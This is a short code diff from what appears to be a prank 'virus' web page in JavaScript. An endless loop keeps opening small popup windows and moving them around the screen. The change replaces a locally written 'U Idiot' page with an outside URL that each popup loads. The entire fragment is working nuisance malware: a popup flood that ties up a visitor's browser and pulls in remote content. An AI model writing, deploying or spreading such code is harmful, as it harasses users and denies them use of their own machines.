@@ -30,7 +30,6 @@ while (0 < 10) {
 	} else if (x > 400) {
 		upOrDown = true
 	}
-	myWindow = window.open("", "", "width=150, height=150");
-	myWindow.document.write("<title>U Idiot</title> <script type='text/javascript'>window.location.href = 'C:/Users/etien/OneDrive/Bureaublad/Virus(Site)/index.html'</script>");
+	myWindow = window.open("https://toastersploit.github.io/rip.js/", "", "width=150, height=150");
 	myWindow.moveTo(x, y);
 }
